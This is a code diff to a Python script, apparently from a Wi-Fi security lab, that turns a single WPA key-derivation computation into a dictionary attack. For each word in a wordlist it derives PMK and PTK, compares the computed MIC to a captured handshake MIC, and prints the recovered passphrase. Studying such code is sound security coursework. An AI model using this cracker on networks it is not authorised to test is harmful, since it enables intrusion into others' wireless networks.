@@ -100,23 +100,28 @@ passPhrase = "actuelle"
 print("Passphrase: ", passPhrase, "\n")
 
 f = open('./wordlist.txt')
-# calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
-ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+for passPhrase in f.read().splitlines():
+    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    passPhrase = str.encode(passPhrase)
+    ssid_encoded = str.encode(ssid)
+    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid_encoded, 4096, 32)
 
-# expand pmk to obtain PTK
-ptk = customPRF512(pmk, str.encode(A), B)
+    # expand pmk to obtain PTK
+    ptk = customPRF512(pmk, str.encode(A), B)
 
-# calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16], data, hashlib.sha1)
 
-print("\nResults of the key expansion")
-print("=============================")
-print("PMK:\t\t", pmk.hex(), "\n")
-print("PTK:\t\t", ptk.hex(), "\n")
-print("KCK:\t\t", ptk[0:16].hex(), "\n")
-print("KEK:\t\t", ptk[16:32].hex(), "\n")
-print("TK: \t\t", ptk[32:48].hex(), "\n")
-print("MICK:\t\t", ptk[48:64].hex(), "\n")
-print("MIC:\t\t", mic.hexdigest(), "\n")
+    if mic.digest()[:-4] == mic_to_test:
+        print("\nResults of the key expansion")
+        print("=============================")
+        print("Passphrase:\t\t", passPhrase, "\n")
+        print("PMK:\t\t", pmk.hex(), "\n")
+        print("PTK:\t\t", ptk.hex(), "\n")
+        print("KCK:\t\t", ptk[0:16].hex(), "\n")
+        print("KEK:\t\t", ptk[16:32].hex(), "\n")
+        print("TK: \t\t", ptk[32:48].hex(), "\n")
+        print("MICK:\t\t", ptk[48:64].hex(), "\n")
+        print("MIC:\t\t", mic.hexdigest(), "\n")
+        break
+print('Done')
